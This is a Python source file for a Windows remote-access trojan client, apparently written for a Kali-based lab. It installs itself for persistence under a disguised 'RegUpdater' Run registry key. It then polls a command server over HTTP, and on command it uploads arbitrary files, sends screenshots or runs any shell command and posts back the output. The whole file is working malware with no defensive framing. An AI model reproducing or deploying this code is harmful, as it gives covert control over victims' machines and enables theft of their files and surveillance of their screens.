# pip install requests
import requests
import subprocess,time,os,random,shutil
# ImageGrab is just for mac and windows
from PIL import ImageGrab
import tempfile 
import winreg as wreg

path = os.getcwd().strip('\n')

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE,
                                            stderr=subprocess.PIPE).decode().split('=')

destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'

if not os.path.exists(destination):
    shutil.copyfile(path + '\client.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,  wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key,'RegUpdater', 0 , wreg.REG_SZ, destination)
    key.Close()
while 1:
        # ip and post of kali
        req = requests.get('http://192.168.1.4:8080') # this line trigger the do_GET in kali and get command from server
        command = req.text
        # req.text contain the command that should be execute
        if 'terminate' in command:
            break
        elif 'grab' in command:
            grab , path = command.split("*")
            if os.path.exists(path):
                url = "http://192.168.1.4:8080/tmp"
                files = {'file': open(path, 'rb')}
                # dict contain key(tag) and value that is file object
                r = requests.post(url, files=files)
                #print(r)
            else:
                post_response = requests.post(url='http://192.168.1.4:8080',data='[-] NOT able to transfer data')
        elif 'screencap' in command:
            dirpath = tempfile.mkdtemp()
            # for windows : "\img.jpg"
            ImageGrab.grab().save(dirpath + "/img.jpg", "JPEG")

            # these lines contains how can  we transfer data over http
            url = "http://192.168.1.4:8080/tmp"
            files = {'file' : open(dirpath + "/img.jpg", "rb")}
            r = requests.post(url,files=files)
            # we should delete that beacause   shutil.rmtree(dirpath) cant delete file which is open by another app
            files['file'].close()
            shutil.rmtree(dirpath)
        else:
            CMD = subprocess.Popen(command,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
            post_response = requests.post(url='http://192.168.1.4:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://192.168.1.4:8080', data=CMD.stderr.read())
time.sleep(3)
